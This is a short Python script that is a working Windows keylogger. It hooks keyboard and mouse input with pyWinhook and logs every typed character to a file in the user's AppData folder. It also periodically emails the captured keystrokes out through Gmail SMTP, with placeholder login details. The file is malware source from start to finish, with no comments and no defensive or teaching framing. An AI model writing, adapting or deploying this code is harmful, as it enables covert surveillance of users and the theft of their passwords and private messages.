import smtplib
from concurrent.futures.thread import ThreadPoolExecutor
from datetime import datetime
import pythoncom
from pyWinhook import HookManager
import getpass
buffer =""
counter = 1
gate = False
filepath ="C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\file.txt"
def sender(buff):
    server = smtplib.SMTP_SSL ('smtp.gmail.com' , 465)
    server.ehlo ()
    server.login ("email" , "passw")
    server.sendmail ("email" , "email" , buff)
    server.close ()
    return
def spy(event):
    global counter,buffer,gate
    if datetime.now().minute == 7 and gate!=True:
        t = ThreadPoolExecutor(max_workers=3)
        t.submit(sender,buffer)
        t.shutdown()
        gate = True
    file = open(filepath,"a",encoding="UTF-8")
    if (event.GetKey() not in ("Lshift","LMenu")) and counter%2!=0 :
        file.write(chr(event.Ascii))
        buffer+=chr(event.Ascii)
    elif event.GetKey() == "Return"and counter%2!=0:
        file.write("\n")
    counter+=1
    file.flush()
    file.close()
    return True
hook = HookManager()
hook.HookKeyboard()
hook.HookMouse()
hook.KeyAll = spy
pythoncom.PumpMessages()